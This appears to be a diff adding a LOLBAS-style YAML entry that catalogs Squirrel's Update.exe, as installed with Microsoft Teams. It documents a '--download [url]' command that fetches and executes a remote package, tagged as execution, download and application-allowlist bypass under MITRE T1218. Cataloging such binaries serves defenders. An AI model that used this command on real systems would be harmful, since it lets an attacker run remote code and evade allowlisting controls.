@@ -1,0 +1,48 @@
+---
+Name: Update.exe
+Description: Binary to update the existing installed Nuget/squirrel package
+Author: User
+Created: Installed date
+Commands:
+  - Command: Update.exe --download [url to package]
+    Description: The above binary will go that particular location and look for RELEASES file and download the nuget package.
+    Usecase: Download and execute binary
+    Category: Execute
+    Privileges: User Privilege
+    MitreID: T1218 
+    MitreLink: https://attack.mitre.org/techniques/T1218/
+    OperatingSystem: Windows OS
+  - Command: Update.exe --download [url to package]
+    Description: The above binary will go that particular location and look for RELEASES file and download the nuget package.
+    Usecase: Download and execute binary
+    Category: AWL Bypass
+    Privileges: User Privilege
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/techniques/T1218/
+    OperatingSystem: Windows 10
+  - Command: Update.exe --download [url to package]
+    Description: The above binary will go that particular location and look for RELEASES file and download the nuget package.
+    Usecase: Download and execute binary
+    Category: Download
+    Privileges: User Privilege
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/techniques/T1218/
+    OperatingSystem: Windows 10
+Full_Path:
+- Path: NA
+- Path: %localappdata%\Microsoft\Teams\update.exe
+Code_Sample: 
+- Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
+Detection: 
+- IOC: NA
+- IOC: NA
+Resources:
+ - Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
+ - Link: https://twitter.com/reegun21/status/1144182772623269889
+ - Link: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/
+ Acknowledgement:
+  - Person: Reegun J (OCBC Bank)
+    Handle: @reegun21
+  - Person: Mr.Un1k0d3r
+    Handle: @MrUn1k0d3r
+---
